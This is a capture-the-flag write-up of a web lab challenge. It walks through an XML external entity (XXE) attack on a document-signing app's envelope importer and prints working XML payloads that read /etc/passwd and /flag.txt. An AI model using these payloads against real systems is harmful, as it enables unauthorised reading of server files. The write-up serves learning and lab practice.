---
title: "Webverselabs Foldmark Challenge XXE "
date: 2026-05-20 00:00:00 +0000
categories: [Webverselabs]
tags: [Webverselabs , Medium , Challenge , Web_Attacks ]
---


## Scenario : 

Foldmark serves about five thousand small businesses and has held SOC 2 Type II since 2024. Last quarter the sales team kept losing migration deals to "we can't bring our history with us," so the product team shipped a cross-vendor envelope importer on a tight deadline — drop in a file from a competitor and Foldmark renders a preview with the signer, document title, organization and timestamp lifted straight from the document.

<img width="1524" height="870" alt="image" src="https://github.com/user-attachments/assets/cd3c2ab3-c575-427c-ba2e-27f979ca11a4" />

As usual, we first naviage the application like a normal user , check different endpoints , different features , ... , This is a documents signing app that uses xml docs , we find this /docs endpoint which gives us an example of the strcuture that our envelope should take . 

<img width="1195" height="716" alt="image" src="https://github.com/user-attachments/assets/3ef2aadd-8201-45d2-a59f-7cc63dbcefed" />

Fuzzing didn't reuturn any additional endpoints , let's just create an account . 

<img width="1249" height="725" alt="image" src="https://github.com/user-attachments/assets/5235d6f2-0342-4295-9678-1dae950063ff" />

We do find this /import endpoint which allows us to impore xml files , now first we will use the example we found in the /docs page , just to get an idea of what fields are returned to us once we submit the file . 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY provider "Example E-Sign Corp">
]>
<envelope>
  <Signer>Patricia Vance</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
  <SourceProvider>&provider;</SourceProvider>
</envelope>
```
<img width="1528" height="821" alt="image" src="https://github.com/user-attachments/assets/51c6314b-4bd5-449e-8690-cb6274a32b64" />

We see that the Singer , Document title and Organization are all returned to us , now first test would be to add a New entity then reference it in one of the fields returned to us . 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY provider "Example E-Sign Corp">
  <!ENTITY xxe "It_worked">
]>
<envelope>
  <Signer>&xxe;</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
  <SourceProvider>&provider;</SourceProvider>
</envelope>
```

<img width="949" height="682" alt="image" src="https://github.com/user-attachments/assets/779d78ba-895f-4502-afa3-1bac88b30bde" />

The fact that it is reflected to us is a good sign , now let's try to read External files , in this case the /etc/passwd , for this one we can use SYSTEM which is the XML keyword that tells the parser to fetch an external resource ,the file:// is the URI scheme that tells it where to fetch from. 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY provider "Example E-Sign Corp">
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<envelope>
  <Signer>&xxe;</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
  <SourceProvider>&provider;</SourceProvider>
</envelope>
```

<img width="1141" height="817" alt="image" src="https://github.com/user-attachments/assets/69995135-a1d0-4cf8-91ab-3305b06618b4" />

Perfect , now that we can read files on the system , we can read the flag on the root directory : /flag.txt 

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE envelope [
  <!ENTITY provider "Example E-Sign Corp">
  <!ENTITY xxe SYSTEM "file:///flag.txt">
]>
<envelope>
  <Signer>&xxe;</Signer>
  <DocumentTitle>Q1 Mutual NDA</DocumentTitle>
  <Timestamp>2026-05-13T09:14:22Z</Timestamp>
  <Organization>Vance &amp; Holloway LLP</Organization>
  <SourceProvider>&provider;</SourceProvider>
</envelope>
```

<img width="1167" height="674" alt="image" src="https://github.com/user-attachments/assets/5dbe38b1-3d2c-4d7a-917e-4d31337290e4" />

That was it for this challenge , see you in the next one :) 





